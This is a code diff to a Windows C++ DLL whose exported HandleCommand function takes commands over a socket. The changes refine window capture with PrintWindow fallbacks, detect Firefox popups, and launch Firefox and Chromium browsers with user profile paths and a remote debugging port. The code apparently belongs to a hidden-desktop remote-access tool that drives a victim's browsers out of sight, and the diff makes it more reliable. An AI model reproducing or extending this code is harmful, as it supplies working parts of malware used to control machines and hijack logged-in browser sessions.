@@ -746,10 +746,12 @@ static void capture_loop() {
 
             PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
             if (!PrintWindow(h, hdcWin, printFlags)) {
-                HDC hdcRealWin = GetWindowDC(h);
-                if (hdcRealWin) {
-                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
-                    ReleaseDC(h, hdcRealWin);
+                if (!PrintWindow(h, hdcWin, 0)) {
+                    HDC hdcRealWin = GetWindowDC(h);
+                    if (hdcRealWin) {
+                        BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
+                        ReleaseDC(h, hdcRealWin);
+                    }
                 }
             }
             BitBlt(hdcMem, rect.left, rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
@@ -953,7 +955,7 @@ static bool is_menu_or_popup(HWND hwnd) {
     wchar_t cls[256];
     if (GetClassNameW(hwnd, cls, 256)) {
         if (wcscmp(cls, L"#32768") == 0) return true; // Standard Win32 Menu
-        if (wcsstr(cls, L"Chrome_WidgetWin_1")) {
+        if (wcsstr(cls, L"Chrome_WidgetWin_1") || wcsstr(cls, L"Mozilla")) {
             // Check if it's a popup/menu by looking for styles
             LONG style = GetWindowLongW(hwnd, GWL_STYLE);
             if ((style & WS_POPUP) && !(style & WS_CAPTION)) return true;
@@ -1516,7 +1518,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     wstring args;
                     if (wRequestedPath == L"Mozilla Firefox") {
-                        args = L" -no-remote -profile \"" + profilePath + L"\\" + profileDir + L"\"";
+                        SetEnvironmentVariableW(L"MOZ_DISABLE_HW_ACCEL", L"1");
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"0");
+                        args = L" -no-remote -profile \"" + profilePath + L"\\" + profileDir + L"\" --disable-gpu";
                     } else {
                         // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
                         args = L" --remote-debugging-port=9222"
